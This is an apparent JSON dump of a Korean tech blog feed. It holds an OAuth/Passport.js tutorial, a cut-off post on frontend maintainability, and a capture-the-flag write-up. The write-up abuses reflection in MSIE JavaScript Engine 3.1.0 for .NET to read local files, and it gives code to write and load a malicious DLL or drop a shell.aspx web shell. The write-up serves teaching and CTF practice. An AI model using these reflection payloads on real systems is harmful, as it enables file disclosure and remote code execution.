{"pageProps":{"posts":[{"title":"OAuth는 삶을 쉽게 만들어 준다 사용 방법, 이점 및 실전 예제","description":"","date":"2024-06-30 18:28","slug":"2024-06-30-OAuthMakesLifeEasy","content":"\n\n저와 같이 기술의 발전으로 게으를 갖고 있는 분이세요? 솔직히 말씀드리자면, 스트레스 받을 건 전혀 가망이 없죠. 보안은 기술에서 매우 중요한 측면이며, 진지하게 고려해야 합니다. 그러나 솔직히 말해요, 우리 중 얼마나 많은 사람들이 안전한 암호를 생성하고 안전하게 보관하는 필요한 단계를 취하는 것을 선호할까요? 이 세대의 기술 사용자들은 그래 할 만큼 게으르죠.\n\n이전에 사람들이 일반적으로 했던 방식은 하나의 강력한 암호를 생성하여 모든 웹 사이트에 사용하는 것이었습니다. 그러나 한 사이트가 침해당한다면, 암호가 노출됩니다. 중요한 사람인 경우, 해커들은 그를 활용하여 소셜 미디어에 로그인할 수 있습니다. 만약 은행 앱에도 같은 암호를 사용하는 무모한 짓을 하려한다면? — \"Otilor\"(요르바어로 \"사라졌거나 망했다\"는 뜻)입니다.\n\n그렇다면, 저와 같이 게으른 사람들에게 좋은 대안은 무엇일까요? 그 대답은 OAuth(Open Authorization)입니다.\n\nOAuth(Open Authorization)란 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\nOAuth은 Google, Facebook 또는 GitHub과 같은 신뢰할 수 있는 플랫폼을 사용하여 인증할 수 있도록 합니다. 이러한 대표적인 사이트들은 보안에 수십억을 투자하고 있습니다. 만약 해커가 Google 또는 Facebook을 성공적으로 해킹할 수 있다면, 나의 계정을 해킹해도 된다고 생각할 수도 있겠지만, 그건 농담이에요. 하지만 사실은 이들에게 우리의 보안을 맡길 수 있다는 것이죠. 그래서 내가 해야 할 일은 구글에 로그인하는 것 뿐이에요. 적어도 그건 하나의 비밀번호일 뿐이니까, 이건 안전하게 지킬 수 있어야겠죠.\n\n구글, Facebook 또는 GitHub에 로그인한 후, 다른 웹사이트에게 내 이름, 프로필 사진 및 계정에서 사용 가능한 기타 정보와 같은 몇 가지 사용자 정보에 대한 접근 권한을 부여할 수 있어요. 이렇게 하면 해당 웹사이트가 나의 인증을 수행할 수 있어요.\n\nOAuth 유형\n\n더 나아가기 전에, Open Authorization에는 OAuth 1.0과 OAuth 2.0 두 가지 유형이 있다는 것을 간략히 언급하고 싶어요. 오늘날 가장 일반적으로 사용되는 버전인 OAuth 2.0은 더 간단하고 유연성이 더 높은 기능을 제공합니다.\n\n<div class=\"content-ad\"></div>\n\n테이블 태그를 Markdown 형식으로 변경해주세요.\n\n<div class=\"content-ad\"></div>\n\n2. 필요한 npm 패키지를 설치해주세요:\n\n\nnpm install express passport passport-google-oauth20 express-session\n\n\n3. index.js 파일을 만들고 Express 애플리케이션을 설정해주세요:\n\n```javascript\nconst express = require('express');\nconst passport = require('passport');\nconst GoogleStrategy = require('passport-google-oauth20').Strategy;\nconst session = require('express-session');\n```\n\n<div class=\"content-ad\"></div>\n\n```javascript\nconst app = express();\n\napp.use(session({\n    secret: 'your_secret_key', // Replace with a secure key\n    resave: false,\n    saveUninitialized: true\n}));\n\napp.use(passport.initialize());\napp.use(passport.session());\n\n// Configure Passport to use Google OAuth\npassport.use(new GoogleStrategy({\n    clientID: 'YOUR_GOOGLE_CLIENT_ID',\n    clientSecret: 'YOUR_GOOGLE_CLIENT_SECRET',\n    callbackURL: 'http://localhost:3000/auth/google/callback'\n},\nfunction(token, tokenSecret, profile, done) {\n    return done(null, profile);\n}));\n```\n\n<div class=\"content-ad\"></div>\n\n```javascript\npassport.serializeUser((user, done) => {\n  done(null, user);\n});\n\npassport.deserializeUser((obj, done) => {\n  done(null, obj);\n});\n\n// Define routes\napp.get('/auth/google',\n  passport.authenticate('google', { scope: ['profile'] }));\n\napp.get('/auth/google/callback',\n  passport.authenticate('google', { failureRedirect: '/' }),\n  (req, res) => {\n    res.redirect('/');\n  });\n```\n\n<div class=\"content-ad\"></div>\n\n\napp.get('/', (req, res) => {\n  res.send(`<h1>Home</h1><a href=\"/auth/google\">Login with Google</a>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});\n\n4. Start your Node.js server with “node index.js”. Open your browser and go to http://localhost:3000. Click on \"Login with Google\" to start the OAuth process.\n\nTo get the Google Client ID and Secret, follow these steps:\n\n\n<div class=\"content-ad\"></div>\n\n- Google Cloud Console로 이동하세요.\n- 새 프로젝트를 만들거나 기존 프로젝트를 선택하세요.\n- API 및 서비스 `자격 증명` 페이지로 이동하세요.\n- `자격 증명 만들기`를 클릭하고 OAuth 클라이언트 ID를 선택하세요.\n- 필수 필드를 작성하여 동의 화면을 구성하세요.\n- 애플리케이션 유형으로 웹 애플리케이션을 선택하세요.\n- http://localhost:3000/auth/google/secrets와 같은 승인된 리디렉션 URI를 추가하세요.\n- 생성을 클릭하여 클라이언트 ID 및 시크릿을 가져오세요.\n\n![OAuthMakesLifeEasy](/assets/img/2024-06-30-OAuthMakesLifeEasy_0.png)\n\n만약 기술에 미숙하다면, 위의 기술 용어에 머리 아프지 마세요. 다음에 \"Google로 가입\"을 보면 안전하니 그냥 사용하세요. 요약하면 이렇습니다. 어쩌다 이런 글을 써야 했네요. HNG 인턴십은 나이지리아와 아프리카의 떠오르는 기술인들에게 흥미로운 기회입니다. HNG 웹사이트를 통해 HNG 인턴십, HNG 채용, 또는 HNG 프리미엄을 확인할 수 있습니다. 안녕히 가세요!","ogImage":{"url":"/assets/img/2024-06-30-OAuthMakesLifeEasy_0.png"},"coverImage":"/assets/img/2024-06-30-OAuthMakesLifeEasy_0.png","tag":["Tech"],"readingTime":4},{"title":"NET에 맞는 JavaScript 엔진 활용 방법","description":"","date":"2024-06-30 18:26","slug":"2024-06-30-ExploitingaJavaScriptEngineforNET","content":"\n\n이 블로그는 .NET 라이브러리용 MSIE JavaScript Engine 버전 3.1.0의 구성 오류를 악용하여 로컬 파일 노출, 임의 파일 쓰기, 원격 코드 실행을 달성하는 내용을 다루고 있습니다. 이는 ICMTC CTF 2024 예선에서 어려운 CTF 도전과제였어요. 함께 시작해봅시다.\n\n도전은 Custom ChatBot 이라 불렸고, 대회에서는 0회 풀렸으며, 저자는 몇 일 동안 도전을 풀고 싶은 사람들을 위해 계속 유지하기로 결정했고, 저는 그에 도전해보았어요. 어떻게 해결했는지 살펴봅시다.\n\n## 도전 설명\n\n![도전 설명](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png)\n\n<div class=\"content-ad\"></div>\n\n도전 과제에는 두 가지 중요한 기능이 있었어요. 하나는 JavaScript로 ChatBot을 사용자 정의하는 것이었고, 다른 하나는 ChatBot과 상호 작용하는 것이었죠.\n\n![이미지1](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_1.png)\n\n![이미지2](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_2.png)\n\n간단한 기능이 실행되고 우리에게 응답이 전송되었음을 확인할 수 있어요. 도전 과제 설명으로부터, JavaScript 코드의 구문 분석을 처리하는 라이브러리와 라이브러리 버전을 알 수 있었구요. 그래서 제가 한 일은 이미 알려진 취약점이나 CVE를 찾아보는 것이었지만 발견하지 못했어요. 그래서 우리가 주변을 살펴보고 환경을 이해하기 시작할 때가 되었어요.\n\n<div class=\"content-ad\"></div>\n\n## 어플리케이션 이해하기\n\n첫 번째로 해야 할 일은 어떤 문맥에서 실행 중이며 어떤 객체들을 사용할 수 있는지 알아내는 것입니다. 그럴려면 어떻게 해야 할까요? 먼저 떠오르는 것은 this 객체인데, 그 중요성에 대해 간단히 설명해 드리겠습니다.\n\nJavaScript나 다른 몇몇 프로그래밍 언어에서 this 키워드는 해당 객체를 가리킵니다. 그 값은 사용된 문맥에 따라 달라집니다. 문맥에 대해 더 잘 설명하기 위해, 브라우저 콘솔에서 JavaScript를 실행하는 간단한 예제를 보여 드리겠습니다. 브라우저 콘솔에서 console.log(this)를 실행하면 window 객체를 얻을 수 있고, 그 문맥 안에서 실행 중이므로 window 객체의 속성에 액세스할 수 있습니다.\n\n![이미지](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_3.png)\n\n<div class=\"content-ad\"></div>\n\n보시다시피 window 객체에서 이용 가능한 많은 멤버들이 있으며 그 중 하나인 document 객체에 접근했습니다. 또한 window 컨텍스트에 정의된 함수에도 접근할 수 있습니다. 예를 들어 atob와 같은 함수가 있습니다.\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_4.png\" />\n\n이제 애플리케이션 컨텍스트에서 this 객체를 탐색하고 해당 멤버들을 모두 나열해야 합니다. 아래의 자바스크립트 코드를 사용하여 모든 멤버를 나열할 수 있습니다:\n\n```js\nfunction processMessage(message) {\n    try {\n        var objs = [];\n        for (var obj in this) {\n            objs.push(obj);\n        }\n        return \"Objects: \" + objs.join(\", \");\n    } catch (e) {\n        return \"Error: \" + e.message;\n    }\n}\nvar response = processMessage(message);\nresponse;\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Screenshot 1](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_5.png)\n\n우리가 얻은 결과에는 JavaScript 코드에서 정의하지 않은 ProcessChat_Helper 객체가 포함되어 있었습니다. 그래서 접근해 보려고 했고, 다음과 같은 응답을 받았습니다:\n\n```js\nthis.ProcessChat_Helper \n```\n\n![Screenshot 2](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_6.png)\n\n\n<div class=\"content-ad\"></div>\n\n결과에 따르면 이 객체는 jail.Controllers.ProcessChatHelper 클래스의 .Net 객체입니다. 그것이 .Net 객체인지 어떻게 알게 되었을까요? JavaScript 객체를 정의하고 동일한 방식으로 액세스하려고 시도하면 완전히 다른 결과를 얻을 수 있습니다.\n\n```js\nvar jsObject = {};\nthis.jsObject\n```\n\n![image](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_7.png)\n\n그렇다면 왜 그리고 어떻게 JavaScript 컨텍스트에서 .Net 객체에 액세스할 수 있을까요? 도전 과제의 로컬 복사본을 만들어보는 중에 답을 찾았습니다. 여기에 .Net 객체를 노출하는 코드가 있습니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n// 코드 조각. \nusing (var engine = new MsieJsEngine())\n{\n  // C# 객체를 JavaScript 컨텍스트에 노출\n  engine.EmbedHostObject(\"ProcessChat_Helper\", ProcessChatHelperObject);\n  // 스크립트를 평가\n  var result = engine.Evaluate<string>(script);\n}\n```\n\n## C#에서의 Reflection\n\nProcessChat_Helper 객체는 ProcessChatHelper 클래스의 인스턴스이며, 해당 클래스가 어떻게 구현되었는지를 알 수 없기 때문에 객체 내의 공개 메서드를 열거해야 합니다. 하지만 어떻게 그것을 할 수 있을까요? 조금의 검색 끝에 GitHub의 라이브러리 저장소로 이동하여 3.1.0 이후의 릴리스에서 뭔가 이상한 것을 발견했습니다.\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_8.png\" />\n\n\n<div class=\"content-ad\"></div>\n\n릴리스에 따르면 AllowReflection의 기본값이 이제 기본적으로 false로 설정되어 있습니다. 이것은 v3.1.0에서 그렇지 않았던 것입니다. 그렇다면 Reflection이란 무엇일까요? 제 친구인 ChatGPT에게 물어봤는데, 그는 전체 과정 동안 큰 도움이 되었습니다. 그가 말한 내용은 다음과 같습니다:\n\n![이미지](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_9.png)\n\n간단히 말하자면, 이 설정이 true로 설정된 경우, .Net 객체에 액세스할 수 있다면 해당 클래스의 속성에 액세스하고 런타임 중에 공개 메서드를 실행할 수 있습니다. 그렇다면 ProcessChat_Helper 객체에 어떤 메서드가 있는지 살펴보겠습니다. 다음 코드로 확인할 수 있습니다:\n\n```js\nfunction processMessage(message) {\n    try {\n        var methods = [];\n        var processChatHelper = this[\"ProcessChat_Helper\"];\n        if (processChatHelper !== undefined) {\n            methods.push(\"Methods: \" + Object.getOwnPropertyNames(processChatHelper).join(\", \"));\n        }\n        return \"\" + methods.join(\", \");\n    } catch (e) {\n        return \"Error: \" + e.message;\n    }\n}\nvar response = processMessage(message);\nresponse;\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_10.png)\n\n해당 객체에는 7가지 메서드가 있고, 이를 호출할 수 있습니다. 예를 들어, GetHashCode() 메서드를 호출하려면 this.ProcessChat_helper.GetHashCode()를 사용하여 클래스 이름을 문자열로 가져올 수 있습니다.\n\n```js\nthis.ProcessChat_Helper.GetHashCode()\n```\n\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_11.png)\n\n\n<div class=\"content-ad\"></div>\n\n## 타입 및 메서드\n\nGetAvailableLanguages() 메서드를 호출하려고 시도했더니 다음과 같은 결과가 나왔어요:\n\n```js\nthis.ProcessChat_Helper.GetAvailableLanguages()\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_12.png\" />\n\n<div class=\"content-ad\"></div>\n\n우리가 돌아온 반환 유형은 실제 데이터가 아니라 문자열 배열이며, Reflection이 활성화되어 있기 때문에 해당 유형의 메서드를 호출할 수 있습니다. 예를 들어, 함수에서 반환된 배열의 길이를 얻고 싶다면 GetLength(0) 메서드를 호출하여 각 색인의 값 가져오려면 GetValue(index)를 사용합니다:\n\n```js\n// 여기서 Zero는 배열의 차원을 나타내며, 우리 경우 1차원 배열\nvar len = this.ProcessChat_Helper.GetAvailableLanguages().GetLength(0); // 2\nvar elements = [];\nfor(let i = 0; i < len; i++) {\n  elements.push(this.ProcessChat_Helper.GetAvailableLanguages().GetValue(i));\n}\nelements.join(', ')\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_13.png\" />\n\n지금까지는 ProcessChatHelper 클래스의 메서드를 호출할 수 있었지만, 더 다룰 클래스인 System.String[]이 있고, 이 코드를 사용하여 해당 클래스의 함수를 나열할 수 있습니다. GetMethods() 함수는 클래스의 모든 메서드 배열을 반환하므로 이를 활용할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar methodsArray = this.ProcessChat_Helper.GetAvailableLanguages().GetType().GetMethods(); \nvar len = methodsArray.GetLength(0);\nvar methods = [];\nfor( let i = 0; i < len; i++) {\n   var typeName = methodsArray.GetValue(i).ToString();\n   methods.push(typeName);\n};\nmethods.join(', ')\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_14.png\" />\n\n이제 우리는 현재 형식이 직접 상속받는 형식, 즉 부모 클래스의 형식을 가져오는 유형의 속성인 BaseClass를 가져올 수도 있습니다. 이 작업을 System.String[] 유형으로 수행하면 System.Object를 얻게 되는데, 이는 다음 섹션에서 매우 유용하게 사용될 것입니다.\n\n```js\nthis.ProcessChat_Helper.GetType().BaseType\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_15.png\" />\n\n## 어셈블리\n\n지금까지 우리는 System.Object, System.String[]을 가지고 있으며 그 중 어느 것도 플래그 파일을 읽을 수 있는 메소드가 없습니다. 이제 어셈블리 속성이 등장합니다. C# 문서에 따르면 타입의 어셈블리 속성은 어셈블리 인스턴스를 반환하며, 이것은 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 개체로 생각할 수 있습니다.\n\n다시 말해, 우리가 System.Object 타입을 가지고 있고 이것의 어셈블리 속성에 액세스했다면, 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 어셈블리가 있습니다. 이는 우리에게 유용합니다. 왜냐하면 로컬 파일을 읽을 수 있는 다른 타입에 액세스하고 싶기 때문에, 우리는 System.IO.File 타입의 ReadAllText 메소드에 액세스함으로써 이를 수행할 수 있습니다. 다음 코드는 어셈블리 내의 모든 타입을 출력합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0); // Array length = 2594 :\"D \nvar types= [];\nfor( let i = 0; i < len; i++) {\n   types.push(typesArray.GetValue(i).ToString());\n};\ntypes.join(\", \")\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_16.png\" />\n\n어셈블리에 있는 모든 타입들입니다. 2594개의 타입이 있습니다.\n\n## 로컬 파일 노출\n\n\n<div class=\"content-ad\"></div>\n\n이제 우리는 System.IO.File 유형이 필요하다는 것을 알았으므로, 해당 유형의 배열에서 인덱스를 가져와 직접 액세스할 수 있어야 합니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0);\nvar types= [];\nfor( let i = 0; i < len; i++) {\n   var typeName = typesArray.GetValue(i).ToString();\n   if(typeName == \"System.IO.File\"){\n      var index = i;\n      break;\n   }\n};\ntypesArray.GetValue(index).ToString() + \"Type found at index: \" + index\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_17.png\" />\n\n이제 동일한 방식으로 System.IO.File 유형에서 ReadAllText 메서드를 가져오겠습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar len = fileTypeMethods.GetLength(0);\nvar methods = {};\nfor( let i = 0; i < len; i++) {\n   var methodName = fileTypeMethods.GetValue(i).ToString();\n   if(methodName.includes(\"ReadAllText\")){\n      var index = i;\n      methods[i] = methodName;\n   }\n};\nJSON.stringify(methods)\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_18.png\" />\n\n필요한 함수는 인덱스 49에 있으므로, 해당 경로로 호출해 보겠습니다. 메서드에 Invoke를 사용할 것입니다. 문서에서 원하는 Invoke 메서드는 2개의 매개변수를 취하며, 둘 다 객체여야 합니다. 첫 번째 매개변수는 해당 메서드를 호출하려는 클래스의 인스턴스여야 하며, 두 번째 매개변수는 메서드에 전달할 인수를 포함하는 배열이어야 합니다. ReadAllText는 정적 메서드이므로 첫 번째 인수는 null이어야 합니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\narg = [\"c:\\\\windows\\\\win.ini\"];\nfileTypeMethods.GetValue(49).Invoke(null, arg)\n```\n\n<div class=\"content-ad\"></div>\n\n\n![2024-06-30-ExploitingaJavaScriptEngineforNET_19](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_19.png)\n\n에러가 발생했습니다! 이 에러의 원인은 Invoke 함수가 JavaScript 객체가 아닌 .Net 객체를 매개변수로 취한다는 것입니다. 따라서 함수에 경로가 될 .Net 객체나 .Net 문자열 배열이 필요합니다.\n\n그래서 열거로 돌아가서, 인스턴스를 가지고 있지 않기 때문에 null이어야 하는 정적 함수를 호출해야 하며, 매개변수를 가져서 하나의 요소로 이루어진 문자열 배열을 반환해야 합니다.\n\n몇 가지 열거를 통해 System.Environment 클래스의 GetCommandLineArgs 함수가 이 작업을 수행한다는 것을 찾아냈습니다. 그러니 호출하여 문자열 배열을 가져오겠습니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0); \nvar types= [];\nfor( let i = 0; i < len; i++) {\n   var typeName = typesArray.GetValue(i).ToString();\n   if(typeName == \"System.Environment\"){\n      var typeIndex = i;\n      break;\n   }\n};\nvar envType = typesArray.GetValue(typeIndex); // typeIndex = 128 \nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null).GetValue(0); \noneElemArr\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_20.png\" />\n\n이 배열을 사용하여 SetValue(Value, index)로 요소를 원하는 파일 경로로 설정하고 invoke 함수에 전달하면 Local File Disclosure을 얻을 수 있습니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileReadMethods = typesArray.GetValue(2008).GetMethods();\nvar envType = typesArray.GetValue(128);\nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null); \noneElemArr.SetValue(\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\", 0);\nfileReadMethods.GetValue(49).Invoke(null, oneElemArr)\n```\n\n<div class=\"content-ad\"></div>\n\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_21.png\" />\n\n## 플래그 읽기\n\n이제 도전 과제의 마지막 조각인데요, c:\\temp 디렉터리에 있는 플래그 파일을 읽어야 합니다. 하지만 우리는 플래그의 이름을 모르기 때문에 flag.txt가 아니라고 확신하고 있어요. 제가 시도해 봤기 때문이죠. 따라서 temp 디렉터리에있는 파일을 나열한 다음에 readfile 메서드를 사용하여 읽어야 합니다.\n\n디렉터리에 있는 파일을 나열하기 위해서, System.IO.Directory 유형의 GetFiles(String path) 메서드가 이를 처리할거에요. 그러니 이를 사용해 봅시다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\r\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\r\nvar typesArray = objectClass.Assembly.GetTypes();\r\nvar len = typesArray.GetLength(0); \r\nvar types = [];\r\nfor( let i = 0; i < len; i++) {\r\n   var typeName = typesArray.GetValue(i).ToString();\r\n   if(typeName == \"System.IO.Directory\"){\r\n      var typeIndex = i;\r\n      break;\r\n   }\r\n};\r\nvar dirTypeMethods = typesArray.GetValue(typeIndex).GetMethods();\r\nvar len = dirTypeMethods.GetLength(0);\r\nvar methods = {};\r\nfor( let i = 0; i < len; i++) {\r\n   var methodName = dirTypeMethods.GetValue(i).ToString();\r\n   if(methodName.includes(\"GetFiles\")){\r\n      var index = i;\r\n      methods[i] = methodName;\r\n   }\r\n};\r\nvar getFilesMethod = dirTypeMethods.GetValue(17); // GetFile(String) at index 17\r\nvar envType = typesArray.GetValue(128);\r\nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null); \r\noneElemArr.SetValue(\"C:\\\\Temp\", 0);\r\n// Getting all the filenames in the c:\\\\temp\r\ntempFilesArr = getFilesMethod.Invoke(null, oneElemArr);\r\nvar len = tempFilesArr.GetLength(0);\r\nvar fileReadMethod = typesArray.GetValue(2008).GetMethods().GetValue(49);\r\nfor( let i = 0; i < len; i++) {\r\n   var fileName = tempFilesArr.GetValue(i);\r\n   oneElemArr.SetValue(fileName, 0);\r\n   // the Flag filename contais Flag and some other random values\r\n   if(fileName.includes(\"Flag\")) {\r\n     // read the flag file\r\n     var fileContent = fileReadMethod.Invoke(null, oneElemArr);\r\n     break;\r\n   }\r\n};\r\nfileContent\r\n```\r\n\r\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_22.png)\r\n\r\n## 원격 코드 실행\r\n\r\nRCE에 대해서는 원격에서 작동하지 않아 작동 원인을 알 수 없었지만 로컬에서는 작동했으므로 다른 누군가에게 도움이 될지도 모르니 코드를 공유하겠습니다.\r\n\n\n<div class=\"content-ad\"></div>\n\nRCE의 아이디어는 System.IO.File 클래스의 WriteAllText(String content, String path)를 사용하여 서버에 악성 .dll 파일을 작성하고, System.Reflection.Assembly 클래스의 LoadFile(String path) 함수를 사용하여 해당 파일을 로드하는 것입니다. 여기서 역쉘 dll 파일의 코드를 찾을 수 있습니다. 이를 컴파일한 후 hex로 인코딩하고 바이트를 \\x69 형식으로 작성하여 코드 내에서 해당 부분을 대체하십시오.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar writeFileMethod = fileTypeMethods.GetValue(51);\nvar writeFileArgs = this.ProcessChat_Helper.GetAvailableLanguages();\nwriteFileArgs.SetValue(\"c:\\\\temp\\\\z4ki.dll\", 0);\nwriteFileArgs.SetValue(\"\\x7a\\x34\\x6b\\x69\", 1); // <--  여기를 편집하세요\nwriteFileMethod.Invoke(null, writeFileArgs);\nvar assemblyType = objectClass.Assembly.GetType().BaseType\nvar oneElemArr = objectClass.Assembly.GetTypes().GetValue(128).GetMethod(\"GetCommandLineArgs\").Invoke(null,null);\noneElemArr.SetValue(\"C:\\\\Temp\\\\z4ki.dll\",0);\nassemblyType.GetMethod(\"LoadFile\").Invoke(null,oneElemArr);\n```\n\n## 또 다른 RCE 방법\n\n다른 방법으로는, 서버의 웹 루트에 shell.aspx 파일을 작성하여 라이브러리에서 원격 코드 실행을 얻을 수 있습니다. 그러나 불행하게도 웹 루트에 쓰기 권한이 없었지만 참고를 위해 코드를 여기에 남깁니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar writeFileMethod = fileTypeMethods.GetValue(51);\nvar writeFileArgs = this.ProcessChat_Helper.GetAvailableLanguages();\nwriteFileArgs.SetValue(\"c:\\\\ChatBot\\\\wwwroot\\\\shell.aspx\", 0);\nwriteFileArgs.SetValue(\"\\x7a\\x34\\x6b\\x69\", 1); // <--  여기를 수정하세요\nwriteFileMethod.Invoke(null, writeFileArgs);\n```\n\n이제 http://`ip`/shell.aspx 로 이동하면 쉘을 찾을 수 있습니다.\n\n여기까지 오신 당신에게 경의를 표하며 읽기를 즐겼고 새로운 것을 배웠기를 바랍니다. 궁금한 점이 있으면 LinkedIn에서 연락해 주세요.\n","ogImage":{"url":"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png"},"coverImage":"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png","tag":["Tech"],"readingTime":15},{"title":"2년 후에도 고통스럽지 않은 프론트엔드 프로젝트 시작하는 방법","description":"","date":"2024-06-27 18:26","slug":"2024-06-27-StartingaFrontendprojectthatwontturnintoanightmarein2years","content":"\n\n새 프로젝트를 시작하면 항상 세상에서 가장 기분 좋은 순간 중 하나입니다. 새로운 시작에는 신선함과 훌륭한 아이디어가 넘쳐납니다. 이번에는 회사에 여러 해 동안 도움이 되는 깨끗하고 유지보수가 용이하며 확장 가능한 프로젝트가 될 것이라고 자신과 팀원들에게 이야기합니다.\n\n하지만 일이 벌어지면! 기능을 계속해서 추가하다 보면 처음에는 그렇게 나쁘지 않다고 생각할 수 있습니다. 그러나 시간이 흐른 뒤에 이 프로젝트가 과거 프로젝트에서 싫어하던 모든 것으로 변해버렸다는 것을 깨닫게 됩니다!\n\n이런 일이 발생하지 않도록 프로젝트의 위험을 최소화하는 방법이 있습니다. 제가 몇 가지 예시를 vue를 사용해서 만들어보았습니다(내 경험이 더 풍부하기 때문에), 하지만 모든 종류의 프론트엔드 프로젝트에 적용됩니다:\n\n# 더 적은 라이브러리는 프로젝트의 장수와 단순함을 의미합니다\n\n<div class=\"content-ad\"></div>\n\n프로젝트의 스택과 라이브러리를 선택할 때 조심해야 해요. 각 라이브러리는 일정 시간을 절약할 수 있는 기능을 가지고 있을 수 있지만 프로젝트에 복잡성을 추가할 수도 있어요. 게다가 그 라이브러리에 의존하게 되면 유지보수되지 않는다면 문제가 생길 수 있어요.\n\n특히 프로젝트 구문 전반에 영향을 주는 라이브러리와 도구들인 Tailwind CSS, SCSS, CSS-in-JS 라이브러리, 그리고 TypeScript은 특히 중요해요.\n\n이러한 라이브러리 각각이 훌륭할 수 있지만, 팀에 따라 선택해야 하며 우리가 언급한 단점을 상쇄할 가치가 있는지 확인해야 해요. 특히 이제 HTML/CSS에 CSS 변수, calc 및 다른 새로운 HTML 기능과 기술이 추가되면서 더 많은 일을 할 수 있어요.\n\n두 가지 프로젝트를 상상해봐요:\n\n<div class=\"content-ad\"></div>\n\n- 프로젝트 원: Vue.js만 사용하여 일반 CSS와 HTML 템플릿을 사용합니다.\n- 프로젝트 투: Vue.js, SCSS, Tailwind CSS, 그리고 PrimeVue를 사용합니다.\n\n# 1년 후 유지보수 시나리오\n\n물론 사람들은 각양각색이고 어떤 사람들은 이러한 기술을 좋아할 수도 있고 내가 쓴 것과 다를 수 있지만, 내가 상상한 것은 다음과 같습니다:\n\n## 프로젝트 원:\n\n<div class=\"content-ad\"></div>\n\n새로운 팀원 온보딩:\n\n- 간단한 프로세스입니다.\n- HTML, CSS 및 기본 Vue.js 구문을 알고 있으면 충분합니다.\n- 주로 프로젝트 코드베이스 및 비즈니스 로직에 중점을 두고 있습니다.\n\n유지보수 및 업데이트:\n\n- 컴포넌트를 만드는 데 더 많은 시간이 필요할 수 있습니다.\n- 개발자들은 잘 알려진 컴포넌트 라이브러리를 참고하여 영감을 얻고 빠르게 컴포넌트를 만들 수 있습니다.\n- 1년 후에는 대부분의 기본 컴포넌트가 이미 구축되어 있습니다.\n- Vue.js를 업데이트할 때 의존성에 대해 크게 걱정할 필요가 없습니다.\n\n<div class=\"content-ad\"></div>\n\n## 두 번째 프로젝트:\n\n신규 팀원 온보딩:\n\n- 모든 템플릿에서 Tailwind CSS 구문을 사용하므로 신규 멤버는 이를 배워야 합니다.\n- PrimeVue 및 SCSS에 대한 지식 또한 필요합니다.\n- Tailwind CSS, PrimeVue 및 SCSS에 대한 문서를 검토하고 이해해야 합니다.\n\n유지 보수 및 업데이트:\n\n<div class=\"content-ad\"></div>\n\n- 새로운 Vue 